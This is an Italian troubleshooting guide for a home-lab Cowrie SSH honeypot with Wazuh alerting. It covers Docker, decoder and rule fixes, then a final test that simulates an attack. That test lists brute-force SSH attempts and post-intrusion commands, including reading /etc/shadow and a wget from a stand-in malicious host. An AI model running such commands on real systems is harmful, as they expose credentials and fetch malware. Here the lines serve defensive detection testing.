>  [English](troubleshooting.en.md) |  **Italiano**

# Troubleshooting - Esperienza Personale

## Errore 1: Container in restart loop infinito

**Sintomo:** `docker ps` mostra lo stato "Restarting" e `docker logs cowrie` mostra:

```
twistd: Unknown command: cowrie
```

**Causa:** Nel `docker-compose.yml` avevo mappato il volume `./etc:/cowrie/cowrie-git/etc`, sovrascrivendo la cartella di configurazione interna del container con una directory **vuota** dell'host. Cowrie non trovava più i suoi file di configurazione e non poteva avviarsi.

**Soluzione:** Ho rimosso il volume `./etc` dal Docker Compose, lasciando che il container usi la configurazione di default integrata nell'immagine. Montare solo i **log**, non la configurazione, a meno di avere una config personalizzata pronta.

**Lezione:** Montare un volume vuoto sopra una directory non-vuota del container la rende vuota dentro il container. Docker **sovrascrive** il contenuto del container con quello dell'host, non il contrario.

## Errore 2: Wazuh - "Too many fields for JSON decoder"

**Sintomo:** La dashboard Wazuh non mostrava nessun evento Cowrie. Il file `/var/ossec/logs/ossec.log` conteneva:

```
analysisd: ERROR: Too many fields for JSON decoder
```

**Causa:** I log JSON di Cowrie sono molto ricchi di dettagli (ogni evento può avere 20-30 campi). Il decoder JSON di Wazuh ha un limite predefinito sul numero di campi analizzabili per evento.

**Soluzione:** Ho aumentato il buffer del decoder modificando `/var/ossec/etc/local_internal_options.conf`:

```properties
analysisd.decoder_order_size=1024
```

Dopo la modifica, riavviare Wazuh:

```bash
sudo /var/ossec/bin/wazuh-control restart
```

## Errore 3: "Connection Refused" durante i test

**Sintomo:** Da Kali Linux, il comando `ssh -p 2222 root@127.0.0.1` dava "Connection refused".

**Causa:** `127.0.0.1` (localhost) è raggiungibile solo dalla macchina stessa. Se testi da un **altro** computer (Kali Linux), devi usare l'IP LAN del Raspberry Pi.

**Soluzione:**

```bash
# ERRATO (da un altro PC)
ssh -p 2222 root@127.0.0.1

# CORRETTO (da un altro PC)
ssh -p 2222 root@192.168.0.102
```

## Errore 4: Log presenti ma Dashboard vuota

**Sintomo:** Wazuh riceveva i log (verificato con `logall_json` in debug mode), ma la dashboard non mostrava nessun alert grafico.

**Causa:** Mancavano le regole custom XML. Wazuh riceveva gli eventi JSON ma non sapeva come classificarli - senza una regola che fa match, l'evento viene registrato nei log interni ma non genera un alert visibile sulla dashboard.

**Soluzione:** Ho creato le regole custom (vedi [regole-wazuh.md](regole-wazuh.md)) e le ho validate con `wazuh-logtest` prima di applicarle. Dopo il riavvio, gli alert hanno iniziato ad apparire.

---

## Test Finale

Per verificare che tutto il sistema funzioni end-to-end:

### 1. Simulare un attacco brute force

Da un altro PC (es. Kali Linux):

```bash
ssh -p 2222 root@<IP_RASPBERRY>
```

Inserire password a caso - ogni tentativo fallito genera un evento `cowrie.login.failed` → alert Wazuh rule 100011.

### 2. Simulare un'intrusione

Inserire una password debole come `root`, `12345`, `password` - Cowrie le accetta deliberatamente. Questo genera un evento `cowrie.login.success` → alert Wazuh rule 100012 (livello 10 = critico).

### 3. Eseguire comandi post-intrusione

Una volta "dentro" l'honeypot:

```bash
whoami          # Genera alert rule 100013
ls              # Genera alert rule 100013
cat /etc/shadow # Genera alert rule 100013 - l'attaccante cerca credenziali
wget http://malicious-site.com/malware  # Cowrie cattura il tentativo di download
```

### 4. Verificare sulla Dashboard Wazuh

Andare su **Threat Hunting** e filtrare per:

- `rule.id: 100012` - mostra tutte le intrusioni riuscite nell'honeypot
- `rule.id: 100013` - mostra tutti i comandi eseguiti dagli attaccanti
- `rule.mitre.id: T1078` - filtra per tecnica MITRE ATT&CK
